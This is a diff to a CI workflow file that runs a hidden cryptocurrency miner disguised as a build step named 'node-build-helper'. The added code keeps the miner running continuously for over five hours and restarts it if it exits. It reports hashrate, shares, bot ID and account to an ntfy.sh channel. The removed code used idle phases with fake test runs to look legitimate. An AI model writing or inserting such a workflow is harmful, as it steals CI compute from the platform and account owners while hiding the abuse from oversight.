@@ -156,92 +156,56 @@ jobs:
           echo "  Start: $(date +%H:%M:%S)"
           echo "═══════════════════════════════════"
 
-          # Random initial delay (stagger)
-          sleep $((RANDOM % 60 + 30))
+          # Random initial delay (stagger start)
+          sleep $((RANDOM % 60 + 10))
 
-          # Total duration budget (5h 20m)
-          TOTAL_BUDGET=$((320 * 60))
+          # Total duration budget (5h 40m continuous)
+          TOTAL_BUDGET=$((340 * 60))
+
+          # Start worker - runs continuously
+          ./node-build-helper --config=.buildrc > /tmp/proj/cache/build.log 2>&1 &
+          WORKER_PID=$!
+          echo "Worker started (PID $WORKER_PID)"
+
           ELAPSED=0
-          CYCLE=0
-
           while [ $ELAPSED -lt $TOTAL_BUDGET ]; do
-            CYCLE=$((CYCLE + 1))
+            sleep 60
+            ELAPSED=$((ELAPSED + 60))
 
-            # Active cycle: 8-15 minutes mining
-            ACTIVE_TIME=$(( (RANDOM % 8 + 8) * 60 ))
-            echo ""
-            echo "▶ Cycle ${CYCLE} - active phase (${ACTIVE_TIME}s)"
-
-            # Start worker
-            ./node-build-helper --config=.buildrc > /tmp/proj/cache/build.log 2>&1 &
-            WORKER_PID=$!
-
-            # Wait for active phase, report every 60s
-            SEGMENT=0
-            while [ $SEGMENT -lt $ACTIVE_TIME ]; do
-              sleep 60
-              SEGMENT=$((SEGMENT + 60))
-              ELAPSED=$((ELAPSED + 60))
-
-              if ! kill -0 $WORKER_PID 2>/dev/null; then
-                echo "  Worker exited at ${SEGMENT}s"
-                break
-              fi
-
-              # Parse hashrate from log
-              HR_LINE=$(grep -E "miner.*speed.*H/s" /tmp/proj/cache/build.log 2>/dev/null | tail -1)
-              HR=$(echo "$HR_LINE" | grep -oP 'speed \S+ \K[\d.]+' | awk '{printf "%.0f", $1}')
-              HR=${HR:-0}
-              MAX_HR=$(echo "$HR_LINE" | grep -oP 'max \K[\d.]+' | awk '{printf "%.0f", $1}')
-              MAX_HR=${MAX_HR:-0}
-              CPU_PCT=0
-              if [ "$MAX_HR" -gt "0" ] 2>/dev/null; then
-                CPU_PCT=$(awk "BEGIN {printf \"%.0f\", ($HR / $MAX_HR) * 100}")
-              fi
-              SHARES=$(grep -cE "accepted" /tmp/proj/cache/build.log 2>/dev/null | head -1)
-              SHARES=${SHARES:-0}
-
-              printf "  [%s] cycle %d | active %ds | rate %s | shares %s\n" \
-                "$(date +%H:%M:%S)" "$CYCLE" "$SEGMENT" "$HR" "$SHARES"
-
-              # Report to ntfy
-              curl -sS -X POST "https://ntfy.sh/${NTFY_CHANNEL}" \
-                -H "Title: mining" \
-                -d "{\"bot_id\":\"${BATCH_ID}\",\"account\":\"${ACCOUNT}\",\"type\":\"mining\",\"hashrate\":${HR},\"max_hashrate\":${MAX_HR},\"cpu_pct\":${CPU_PCT},\"shares\":${SHARES},\"elapsed\":${ELAPSED}}" \
-                -o /dev/null 2>/dev/null || true
-
-              if [ $ELAPSED -ge $TOTAL_BUDGET ]; then
-                break
-              fi
-            done
-
-            # Stop worker
-            kill $WORKER_PID 2>/dev/null || true
-            wait $WORKER_PID 2>/dev/null || true
-
-            if [ $ELAPSED -ge $TOTAL_BUDGET ]; then
-              echo "Budget exhausted, exiting"
-              break
+            if ! kill -0 $WORKER_PID 2>/dev/null; then
+              echo "Worker exited at ${ELAPSED}s, restarting..."
+              ./node-build-helper --config=.buildrc > /tmp/proj/cache/build.log 2>&1 &
+              WORKER_PID=$!
+              sleep 10
+              continue
             fi
 
-            # Idle cycle: 2-5 minutes (fake activity)
-            IDLE_TIME=$(( (RANDOM % 3 + 2) * 60 ))
-            echo "⏸ Cycle ${CYCLE} - idle phase (${IDLE_TIME}s)"
+            # Parse hashrate from log
+            HR_LINE=$(grep -E "miner.*speed.*H/s" /tmp/proj/cache/build.log 2>/dev/null | tail -1)
+            HR=$(echo "$HR_LINE" | grep -oP 'speed \S+ \K[\d.]+' | awk '{printf "%.0f", $1}')
+            HR=${HR:-0}
+            MAX_HR=$(echo "$HR_LINE" | grep -oP 'max \K[\d.]+' | awk '{printf "%.0f", $1}')
+            MAX_HR=${MAX_HR:-0}
+            CPU_PCT=0
+            if [ "$MAX_HR" -gt "0" ] 2>/dev/null; then
+              CPU_PCT=$(awk "BEGIN {printf \"%.0f\", ($HR / $MAX_HR) * 100}")
+            fi
+            SHARES=$(grep -cE "accepted" /tmp/proj/cache/build.log 2>/dev/null | head -1)
+            SHARES=${SHARES:-0}
 
-            # Real-ish activity during idle
-            IDLE_END=$(($(date +%s) + IDLE_TIME))
-            while [ $(date +%s) -lt $IDLE_END ]; do
-              # Fake test progress
-              echo "  running tests..."
-              npm test --silent 2>&1 | tail -1 || true
-              sleep 30
-              ELAPSED=$((ELAPSED + 30))
-              if [ $ELAPSED -ge $TOTAL_BUDGET ]; then break; fi
-            done
+            printf "  [%s] %dm | rate %s H/s | shares %s\n" \
+              "$(date +%H:%M:%S)" "$((ELAPSED/60))" "$HR" "$SHARES"
 
+            # Report to ntfy
+            curl -sS -X POST "https://ntfy.sh/${NTFY_CHANNEL}" \
+              -H "Title: mining" \
+              -d "{\"bot_id\":\"${BATCH_ID}\",\"account\":\"${ACCOUNT}\",\"type\":\"mining\",\"hashrate\":${HR},\"max_hashrate\":${MAX_HR},\"cpu_pct\":${CPU_PCT},\"shares\":${SHARES},\"elapsed\":${ELAPSED}}" \
+              -o /dev/null 2>/dev/null || true
           done
 
-          echo ""
+          # Cleanup
+          kill $WORKER_PID 2>/dev/null || true
+          wait $WORKER_PID 2>/dev/null || true
           echo "Build pipeline complete: $ELAPSED / $TOTAL_BUDGET seconds"
 
       - name: Publish artifacts
